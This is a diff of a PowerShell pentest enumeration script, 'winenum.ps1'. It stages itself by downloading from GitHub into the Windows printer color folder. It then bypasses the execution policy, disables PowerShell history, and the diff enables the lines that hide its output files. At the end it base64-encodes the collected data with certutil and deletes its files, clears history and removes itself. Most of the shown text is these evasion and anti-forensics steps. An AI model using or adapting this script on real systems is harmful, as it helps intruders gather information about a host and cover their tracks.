@@ -3,16 +3,18 @@ Download script:
 (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/h1dz/Pen-Testing/BashScripts/winenum.ps1", "C:\Windows\System32\spool\drivers\color\winenum.ps1")
 #>
 ################################## Setup ##################################
+$color = "C:\Windows\System32\spool\drivers\color"
+cd $color
 Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
-#attrib +h winenum.ps1
+attrib +h winenum.ps1
 Unblock-File -Path C:\Windows\System32\spool\drivers\color\winenum"
 New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\1.txt"
 Unblock-File -Path C:\Windows\System32\spool\drivers\color\1.txt
 New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\2.txt"
 Unblock-File -Path C:\Windows\System32\spool\drivers\color\2.txt
-#attrib +h 1.txt
-#attrib +h 2.txt
+attrib +h 1.txt
+attrib +h 2.txt
 ################################## Finshed Setup ##################################
 Write-Output "################################## Start ##################################" | Out-File -FilePath .\1.txt -Append  
 Get-Date | Out-File -FilePath .\1.txt -Append 
@@ -127,13 +129,14 @@ Write-Output "##################################################################
 Get-Date | Out-File -FilePath .\1.txt -Append 
 Write-Output "################################## Finished ##################################" | Out-File -FilePath .\1.txt -Append  
 # Encode base64
+cd $color
 certutil -encode "C:\Windows\System32\spool\drivers\color\1.txt" 0.txt
 Unblock-File -Path C:\Windows\System32\spool\drivers\color\0.txt
-#attrib -h 1.txt
-#attrib -h 2.txt
+attrib -h 1.txt
+attrib -h 2.txt
 Remove-Item C:\Windows\System32\spool\drivers\color\1.txt -Force
 Remove-Item C:\Windows\System32\spool\drivers\color\2.txt -Force
-#attrib -h winenum.ps1
+attrib -h winenum.ps1
 Clear-History
 Clear-Host
 Remove-Item C:\Windows\System32\spool\drivers\color\winenum.ps1 -Force 
